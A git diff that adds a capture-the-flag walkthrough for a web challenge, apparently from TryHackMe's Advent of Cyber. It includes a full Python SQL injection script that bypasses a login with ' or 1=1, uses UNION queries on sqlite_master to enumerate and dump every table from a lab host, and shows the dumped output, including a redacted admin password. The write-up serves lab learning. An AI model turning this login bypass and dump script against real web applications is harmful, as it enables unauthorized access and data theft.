@@ -350,6 +350,7 @@ So, this one could be automated, but I added one cheat to let it run faster sinc
 ![](../assets/images/adventofcyber/day4-site.png)
 
 Here are the highlights:
+
 - Read in all words from the provided wordlists
 - Use all words that contain "api" and test url + word
 - If the status code is not `404`, save that word
@@ -415,10 +416,180 @@ flag THM{D4...1} found at 20201125
 ```
 
 ## Day 5 ##
-- Web
-- Someone stole Santa's gift list!
-- Learn to detect and exploit one of the most dangerous web vulnerabilities!
-- SQLi PHP
+
+### Someone stole Santa's gift list! - web exploitation
+
+> After last year's attack, Santa and the security team have worked hard on reviving Santa's personal portal. Hence, 'Santa's forum 2' went live.
+
+Nothing like rolling your own `sqlmap`. This was a fun challenge to automate and dump all the tables in a **sqlite** database. Request and Beautiful Soup makes this a really easy task (not as easy as finding the sqli in the website) but where is the fun in that.
+
+![](../assets/images/adventofcyber/day5-site.png)
+
+Here are the highlights:
+
+- Find the panel and bypass the login
+- Find sqli in the search function
+- Determine the number of columns in the query
+- Use a union attack to discover table names
+- Use a union attack to discover column names
+- Dump the tables and answer the questions
+
+
+```python3
+#!/usr/bin/env python3
+
+import requests
+from bs4 import BeautifulSoup as bs
+import re
+
+
+url = "http://10.10.32.80:8000/"
+
+login = 'santapanel' # hint helps here
+
+
+s = requests.session()
+r = s.get(url + login)
+
+username = "' or 1=1 -- "
+password = 'whatevs'
+
+data = {'username':username, 'password':password}
+
+r = s.post(url + login, data=data,allow_redirects=False)
+soup = bs(r.text, features='lxml')
+
+
+def query(payload):
+    params = {'search': payload}
+    r = s.get(url+login,params=params,cookies=s.cookies)
+    soup = bs(r.text, features='lxml')
+    
+    data = []
+    table = soup.find('table')
+    rows = table.find_all('tr')
+    for row in rows:
+        cols = row.find_all('td')
+        cols = [ele.text.strip() for ele in cols]
+        data.append([ele for ele in cols if ele]) # Get rid of empty values
+    return(data)
+
+
+## Get Number of Columns
+print("=== Getting number of columns ===")
+for c in range(1,15):
+    payload = f"' or 1=1 order by {c} -- "
+    data = query(payload)
+    if 'error' in data[1]:
+        break
+colcnt = c-1
+
+print(f"Number of columns is {colcnt}")
+
+## Get Table Names
+print("\n\n=== Getting Table Name === ")
+payload = "madeye' union select tbl_name,tbl_name from sqlite_master -- "
+data = query(payload)
+tables = [d[1] for d in data[1:]]
+print(tables)
+
+## Get Columns for Tables
+patt = re.compile('CREATE TABLE (\w*) (\([^\)]*\))')
+print(f"\n\n=== Getting Columns for Tables ===")
+payload = "madeye' union select sql, sql from sqlite_master -- " 
+data =  query(payload)
+_tables = {}
+for d in data[1:]:
+    match = patt.findall(d[0])
+    if match:
+        _tables[match[0][0]] = match[0][1]
+tables = {}
+for table, columns in _tables.items():
+    cols = [c.split()[0] for c in columns[1:-1].split(',')]
+    tables[table] = cols
+for tbl,col in tables.items():
+    print(f"Table {tbl} has columns {col}")
+
+# Dump Tables
+print("\n\n=== Dumping Tables ===")
+for table, columns in tables.items():
+    print(f'Table: {table}')
+    print(' : '.join(columns))
+    print('----------------')
+    results = []
+    colp = "||' : '||".join(columns)
+    payload = f"madeye' union select {colp},'1' from {table} -- " 
+    data = query(payload)
+    for d in data[1:]:
+        print(d[0])
+    print("--------------")
+    print(f"Total Entries: {len(data[1:])}")
+    print('\n')
+```
+
+Running the script gives the following redacted answers:
+
+```
+./solve.py                                                                              
+=== Getting number of columns ===
+Number of columns is 2
+
+
+=== Getting Table Name === 
+['hidden_table', 'sequels', 'users']
+
+
+=== Getting Columns for Tables ===
+Table hidden_table has columns ['flag']
+Table sequels has columns ['title', 'kid', 'age']
+Table users has columns ['username', 'password']
+
+
+=== Dumping Tables ===
+Table: hidden_table
+flag
+----------------
+thmfox{All_..._You}
+--------------
+Total Entries: 1
+
+
+Table: sequels
+title : kid : age
+----------------
+10 McDonalds meals : Thomas : 10
+TryHackMe Sub : Kenneth : 19
+air hockey table : Christopher : 8
+bike : Matthew : 15
+books : Richard : 9
+candy : David : 6
+chair : Joshua : 12
+fazer chocolate : Donald : 4
+finnish-english dictionary : James : 8
+gi...b o....ip : Paul : 9
+iphone : Robert : 17
+laptop : Steven : 11
+lego star wars : Daniel : 12
+playstation : Michael : 5
+rasberry pie : Andrew : 16
+shoes : James : 8
+skateboard : John : 4
+socks : Joseph : 7
+table tennis : Anthony : 3
+toy car : Charles : 3
+wii : Mark : 17
+xbox : William : 6
+--------------
+Total Entries: 22
+
+
+Table: users
+username : password
+----------------
+admin : Eh....c7gB
+--------------
+Total Entries: 1
+```
 
 ## Day 6 ##
 
